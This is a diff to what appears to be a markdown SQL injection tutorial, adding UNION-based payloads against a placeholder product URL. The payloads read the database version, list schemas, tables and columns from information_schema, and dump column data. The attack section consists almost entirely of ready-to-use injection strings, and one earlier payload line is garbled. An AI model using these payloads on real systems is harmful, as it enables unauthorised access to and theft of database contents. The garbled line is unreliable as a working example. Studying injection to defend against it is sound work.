@@ -83,9 +83,18 @@
              2. *Get the vulnerable column:* https://website.com/product/id?=23' UNION SELECT 1,2' UNION SELECT 1,2,3,4,5--,3-- ***(0xHEX the UNION SELECT 1,2,3,4,5--)***
              3. now, you got the point. 🙂
 
-### 5) Exploit. (get the data from database).
+### 5) Exploit. (get the data from database)
 - So, after getting vulnerable columns, we can get the data from database by using various payloads.
-- example : https://website.com/product/id?=23' UNION SELECT NULL,@@version,NULL-- to get the database version.
+- **get the version**
+   - https://website.com/product/id?=23' UNION SELECT NULL,@@version,NULL--
+- **get the database**
+   - https://website.com/product/id?=23' UNION SELECT NULL,concat(schema_name), NULL FROM information_schema.schemata--
+- **get the tables**
+  - https://website.com/product/id?=23' UNION SELECT NULL,concat(table_name), NULL FROM information_schema.tables WHERE table_schema='DATABASE'--
+- **get the columns**
+   - https://website.com/product/id?=23' UNION SELECT NULL,concat(column_name), NULL FROM information_schema.columns WHERE table_name='TABLE_NAME'--
+- **get the data**
+   - https://website.com/product/id?=23' UNION SELECT NULL,concat(0x28,column_1,0x3a,column_2,0x29), NULL FROM TABLE_NAME--
 
 
 **Note:** not completed. to be continued...
